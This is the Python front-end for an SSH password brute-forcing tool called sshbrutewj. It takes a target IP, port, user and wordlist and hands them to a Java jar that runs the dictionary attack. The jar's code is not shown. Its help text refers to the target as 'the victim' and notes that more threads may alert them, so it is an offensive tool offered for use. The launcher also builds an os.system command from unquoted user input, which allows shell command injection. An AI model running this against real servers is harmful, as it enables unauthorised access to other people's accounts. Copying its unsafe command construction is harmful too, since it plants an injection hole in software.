from colorama import Fore
import argparse
import os
import sys

version = "ALPHA 1.0.0"

def credits():
    print("sshbrutewj" + version)
    print("Credits:")
    print("Ayple https://github.com/ItsNotAyPle")
    print("Solirs https://github.com/Solirs")
    sys.exit(0)


def output_text(color:Fore, text:str):
    print(color, "\r[-]", text, Fore.RESET)

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-w', help='The wordlist file path for the dictionary attack', required=True, type=str)
    parser.add_argument('-u', help='User', required=True, type=str)
    parser.add_argument('-i', help='IP', required=True, type=str)
    parser.add_argument('-p', help='Port', required=True, type=str)
    parser.add_argument('-v', help='Verbose', required=False, type=str)
    parser.add_argument('-t', help='The number of threads you wish to use. The more threads used the faster \
                        but could lead to some problems and easily notify the victim.', type=int)
    return parser.parse_args()

def load_main(wordlist, thread_count, ip, port, user):
    # the run command goes here with the args
    output_text(Fore.GREEN, "Everything was good. Loading main file...")
    os.system(f"java -jar sshbrutewj.jar {ip} {port} {user} {wordlist} {thread_count}")

if __name__ == '__main__':
    if os.name == 'nt':
        pass
    elif os.name == 'posix':
        pass

    if len(sys.argv) == 1:
        credits()
    args = parse_args()
    wordlist = args.w
    thread_count = args.t
    ip_addr = args.i
    port = args.p 
    user = args.u
    verbose = args.v
    if not os.path.exists(wordlist): 
        output_text(Fore.RED, f"Wordlist '{wordlist}' does not exist!")
        exit()
    if not os.path.isfile(wordlist):
        output_text(Fore.RED, f"Wordlist has to be a file!")
        exit()

    if thread_count == None:
        thread_count = 1
        output_text(Fore.YELLOW, f"Thread count was not set and will automatically be {thread_count}")

    load_main(wordlist, thread_count, ip_addr, port, user)
